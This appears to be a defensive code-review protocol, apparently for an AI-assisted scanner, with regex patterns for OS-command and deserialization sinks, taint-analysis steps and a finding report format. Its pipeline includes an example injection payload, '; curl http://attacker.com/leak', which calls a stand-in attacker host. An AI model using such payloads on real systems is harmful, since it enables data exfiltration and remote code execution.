<DEEP_SCAN_V3>
@ID: COMMAND_CODE_EXECUTION_SINKS
@GOAL: IDENTIFY_DANGEROUS_FUNCTIONS_CAPABLE_OF_EXECUTING_OS_COMMANDS_OR_CODE
@PARENT_CONTEXT: entry_points.protocol, privilege_transitions.protocol

<GLOBAL_VARS>
OS_COMMAND_SINKS: {
  "PYTHON": "(os\.(system|popen|spawn)|subprocess\.(run|call|Popen|check_output))",
  "NODEJS": "(child_process\.(exec|spawn|fork)|shelljs\.exec)"
}
DESERIALIZATION_SINKS: "(unserialize|pickle\.load|yaml\.load|marshal\.load)"
</GLOBAL_VARS>

<EXECUTION_PIPELINE>
1. SINK_INVENTORY_SCAN: Поиск всех вызовов из [OS_COMMAND_SINKS] и [DESERIALIZATION_SINKS].
2. ARGUMENT_TAINT_ANALYSIS: Если аргумент — переменная, отследить путь до [EXTERNAL_INPUTS].
3. SHELL_MODE_VERIFY: Если `shell=True` — приоритет BLOCKER.
4. SCENARIO_GENERATION: Сформировать Payload (например, `; curl http://attacker.com/leak`).

   - HYBRID_ANALYSIS: Read JSON artifacts (syft.json, grype.json, kics.json) from .security_review/artifacts/raw_tools_output/. Treat these results as 'Hard Evidence'. Perform AI Reachability Analysis to verify if the vulnerable component is reachable from the code. If confirmed, elevate the finding status to BLOCKER.
</EXECUTION_PIPELINE>

<OUTPUT_SPEC>
# ФОРМАТ ДЛЯ АВТОМАТИЧЕСКОГО ПАРСИНГА БЭКЕНДОМ
🚨 FINDING [command_code_execution]:
FILE: [PATH]
LINE: [NUM]
CODE: [SINK_CALL_SNIPPET]
DESCRIPTION: [Tool_Name] found [Vulnerability_ID]. AI Analysis confirmed that the vulnerable path is active in the current code flow via [Function_Name].
SCENARIO_OF_ATTACK: An attacker sends a payload containing shell metacharacters (e.g., ;, |, &) to [ENTRY_POINT]. The application executes this as part of a system command, allowing the attacker to run arbitrary code with [USER] privileges.
@ANALYTICS_DATA: {"domain": "LOGIC_INTEGRITY", "impact": 1.0}
VISUALIZE: "Image of an attack tree: Root node is 'Remote Code Execution'."
</OUTPUT_SPEC>
</DEEP_SCAN_V3>